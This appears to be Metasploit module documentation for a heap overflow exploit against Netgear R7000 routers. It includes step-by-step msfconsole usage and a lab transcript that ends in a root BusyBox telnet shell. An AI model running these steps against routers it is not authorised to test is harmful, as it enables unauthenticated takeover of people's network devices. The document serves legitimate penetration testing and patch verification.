## Introduction
This module exploits a heap buffer overflow in the `genie.cgi?backup.cgi`
page of Netgear R7000 routers running firmware versions `1.0.11.116` and prior.
Successful exploitation results in unauthenticated attackers gaining
code execution as the `root` user.

The exploit utilizes these privileges to enable the telnet server
which allows attackers to connect to the target and execute commands
as the `admin` user from within a BusyBox shell. Users can connect to
this telnet server by running the command `telnet *target IP*`.


## Vulnerable Application

Netgear R7000 routers running firmware version `1.0.11.116` and earlier.

## Verification Steps

  1. Start msfconsole
  2. Do: `use auxiliary/admin/http/netgear_r7000_backup_cgi_heap_overflow_rce `
  3. Do: `set RHOSTS <RouterIP>`
  5. Do: `exploit`
  6. Wait for the message about how to connect to the telnet shell to appear.
  7. Connect to the telnet shell by executing `telnet <RouterIP>`
  8. Verify that you now have a BusyBox shell running as the `admin` user.

## Options

## Scenarios

### Netgear R7000 with Firmware Version 1.0.11.116
```
msf6 > use auxiliary/admin/http/netgear_r7000_backup_cgi_heap_overflow_rce
msf6 auxiliary(admin/http/netgear_r7000_backup_cgi_heap_overflow_rce) > set RHOSTS 192.168.1.1
RHOSTS => 192.168.1.1
msf6 auxiliary(admin/http/netgear_r7000_backup_cgi_heap_overflow_rce) > show options

Module options (auxiliary/admin/http/netgear_r7000_backup_cgi_heap_overflow_rce):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   192.168.1.1      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                     no        HTTP server virtual host

msf6 auxiliary(admin/http/netgear_r7000_backup_cgi_heap_overflow_rce) > run
[*] Running module against 192.168.1.1

[*] Executing automatic check (disable AutoCheck to override)
[*] Router is a NETGEAR router (R7000)
[+] The target is vulnerable.
[*] Sending 10th and final packet...
[*] If the exploit succeeds, you should be able to connect to the telnet shell by running: telnet 192.168.1.1
[*] Auxiliary module execution completed
msf6 auxiliary(admin/http/netgear_r7000_backup_cgi_heap_overflow_rce) >
```

And in a separate terminal shell:

```
 ~/git/metasploit-framework │ CVE-2021-31802 !1  telnet 192.168.1.1                                                ✔ │ 2.7.2 Ruby
Trying 192.168.1.1...
telnet: Unable to connect to remote host: Connection refused
 ~/git/metasploit-framework │ CVE-2021-31802 !2  telnet 192.168.1.1                                              1 х │ 2.7.2 Ruby
Trying 192.168.1.1...
Connected to 192.168.1.1.
Escape character is '^]'.


BusyBox v1.7.2 (2020-12-21 13:01:11 CST) built-in shell (ash)
Enter 'help' for a list of built-in commands.

# uname -a
Linux R7000 2.6.36.4brcmarm+ #30 SMP PREEMPT Mon Dec 21 12:35:01 CST 2020 armv7l unknown
# id
uid=0(admin) gid=0(root)
#
```



